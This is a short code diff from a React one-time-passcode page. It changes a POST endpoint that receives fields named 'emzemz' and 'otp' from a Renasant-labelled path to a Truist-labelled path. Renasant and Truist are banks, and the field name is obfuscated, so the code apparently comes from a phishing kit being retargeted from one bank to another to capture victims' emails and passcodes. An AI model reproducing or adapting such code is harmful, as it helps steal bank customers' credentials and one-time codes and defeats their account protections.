@@ -41,7 +41,7 @@ const OTP: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/renasant-meta-data-8/`, {
+      await axios.post(`${baseUrl}api/truist-meta-data-8/`, {
         emzemz,
         otp,
       });
